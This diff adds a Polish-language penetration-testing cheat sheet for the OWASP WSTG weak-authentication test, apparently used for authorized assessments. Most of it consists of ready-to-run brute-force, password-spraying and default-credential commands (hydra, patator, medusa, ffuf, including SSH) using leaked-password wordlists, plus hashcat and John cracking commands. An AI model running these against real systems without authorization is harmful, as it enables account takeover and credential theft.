@@ -1,0 +1,89 @@
+================================================================================
+WSTG-ATHN-07 — Testing for Weak Authentication Methods
+================================================================================
+CELE:
+- Przetestowac odpornosc na brute force
+- Ocenic polityki hasel
+- Sprawdzic sile mechanizmow uwierzytelniania
+
+================================================================================
+KOMENDY
+================================================================================
+
+# --- Test polityki hasel - proby rejestracji ze slabymi haslami ---
+curl -s -X POST "https://TARGET/api/register" -H "Content-Type: application/json" -d '{"username":"weaktest1","password":"123","email":"w1@test.com"}' -v
+curl -s -X POST "https://TARGET/api/register" -H "Content-Type: application/json" -d '{"username":"weaktest2","password":"password","email":"w2@test.com"}' -v
+curl -s -X POST "https://TARGET/api/register" -H "Content-Type: application/json" -d '{"username":"weaktest3","password":"aaaa","email":"w3@test.com"}' -v
+curl -s -X POST "https://TARGET/api/register" -H "Content-Type: application/json" -d '{"username":"weaktest4","password":"12345678","email":"w4@test.com"}' -v
+curl -s -X POST "https://TARGET/api/register" -H "Content-Type: application/json" -d '{"username":"weaktest5","password":"Password1","email":"w5@test.com"}' -v
+
+# --- Test zmiany hasla na slabe ---
+curl -s -X POST "https://TARGET/api/change-password" -H "Authorization: Bearer TOKEN" -H "Content-Type: application/json" -d '{"old_password":"StrongPass@1","new_password":"123"}' -v
+
+# --- Sprawdzenie czy haslo moze byc takie samo jak username ---
+curl -s -X POST "https://TARGET/api/register" -H "Content-Type: application/json" -d '{"username":"testuser","password":"testuser","email":"same@test.com"}' -v
+
+# --- Patator - brute force HTTP POST ---
+patator http_fuzz url="https://TARGET/api/login" method=POST body='{"username":"admin","password":"FILE0"}' header="Content-Type: application/json" 0=/home/parallels/Desktop/WSTG/SecLists-master/Passwords/Common-Credentials/10k-most-common.txt -x ignore:code=401
+
+# --- Sprawdzenie HTTP Basic Auth ---
+curl -s -v "https://TARGET/" -u "admin:admin"
+curl -s -v "https://TARGET/" -u "admin:password"
+
+# --- Sprawdzenie Digest Auth ---
+curl -s -v --digest -u "admin:admin" "https://TARGET/"
+
+================================================================================
+KOMENDY Z WORDLISTAMI
+================================================================================
+
+# --- Hydra brute force HTTP POST form ---
+hydra -l admin -P /home/parallels/Desktop/WSTG/SecLists-master/Passwords/Common-Credentials/10k-most-common.txt TARGET https-post-form "/api/login:username=^USER^&password=^PASS^:F=Invalid"
+
+# --- Hydra z darkweb top 10000 ---
+hydra -l admin -P /home/parallels/Desktop/WSTG/SecLists-master/Passwords/Common-Credentials/darkweb2017_top-10000.txt TARGET https-post-form "/api/login:username=^USER^&password=^PASS^:F=Invalid"
+
+# --- Hydra z xato-net milion hasel ---
+hydra -l admin -P /home/parallels/Desktop/WSTG/SecLists-master/Passwords/Common-Credentials/xato-net-10-million-passwords-1000000.txt TARGET https-post-form "/api/login:username=^USER^&password=^PASS^:F=Invalid" -t 4
+
+# --- Hydra z leaked databases ---
+hydra -l admin -P /home/parallels/Desktop/WSTG/SecLists-master/Passwords/Leaked-Databases/rockyou-75.txt TARGET https-post-form "/api/login:username=^USER^&password=^PASS^:F=Invalid"
+
+# --- Medusa brute force ---
+medusa -h TARGET -u admin -P /home/parallels/Desktop/WSTG/SecLists-master/Passwords/Common-Credentials/10k-most-common.txt -M http -m DIR:/api/login
+
+# --- ffuf brute force ---
+ffuf -w /home/parallels/Desktop/WSTG/SecLists-master/Passwords/Common-Credentials/10k-most-common.txt:PASS -u "https://TARGET/api/login" -X POST -H "Content-Type: application/json" -d '{"username":"admin","password":"PASS"}' -fc 401
+
+# --- ffuf z darkweb top 1000 ---
+ffuf -w /home/parallels/Desktop/WSTG/SecLists-master/Passwords/Common-Credentials/darkweb2017_top-1000.txt:PASS -u "https://TARGET/api/login" -X POST -H "Content-Type: application/json" -d '{"username":"admin","password":"PASS"}' -fc 401
+
+# --- Hydra z Pwdb top 100000 ---
+hydra -l admin -P /home/parallels/Desktop/WSTG/SecLists-master/Passwords/Common-Credentials/Pwdb_top-100000.txt TARGET https-post-form "/api/login:username=^USER^&password=^PASS^:F=Invalid"
+
+# --- Hydra SSH brute force ---
+hydra -l admin -P /home/parallels/Desktop/WSTG/SecLists-master/Passwords/Common-Credentials/10k-most-common.txt TARGET ssh
+
+# --- Hydra z leaked databases - phpbb ---
+hydra -l admin -P /home/parallels/Desktop/WSTG/SecLists-master/Passwords/Leaked-Databases/phpbb-cleaned-up.txt TARGET https-post-form "/api/login:username=^USER^&password=^PASS^:F=Invalid"
+
+# --- Password spray z 200 najpopularniejszych hasel ---
+hydra -L /home/parallels/Desktop/WSTG/SecLists-master/Usernames/top-usernames-shortlist.txt -P /home/parallels/Desktop/WSTG/SecLists-master/Passwords/Common-Credentials/2025-199_most_used_passwords.txt TARGET https-post-form "/api/login:username=^USER^&password=^PASS^:F=Invalid"
+
+# --- John the Ripper (offline hash cracking) ---
+john --wordlist=/home/parallels/Desktop/WSTG/SecLists-master/Passwords/Common-Credentials/10k-most-common.txt hashes.txt
+
+# --- Hashcat (offline hash cracking) ---
+hashcat -m 0 -a 0 hashes.txt /home/parallels/Desktop/WSTG/SecLists-master/Passwords/Leaked-Databases/rockyou-75.txt
+
+================================================================================
+WERYFIKACJA MANUALNA (Burp Suite / Przegladarka / DevTools)
+================================================================================
+1. Przetestuj polityki hasel: minimalna dlugosc, wymagane znaki, zlozonosc
+2. Sprawdz czy aplikacja blokuje najczesciej uzywane hasla
+3. W Burp Intruder skonfiguruj atak brute force i monitoruj odpowiedzi
+4. Sprawdz czy istnieje rate limiting na endpoincie logowania
+5. Przetestuj czy haslo moze byc takie samo jak username lub email
+6. Sprawdz czy aplikacja wymaga silnego hasla przy zmianie
+7. Przetestuj HTTP Basic/Digest authentication jesli jest uzywane
+8. Sprawdz czy tokeny sesji sa wystarczajaco losowe i dlugie
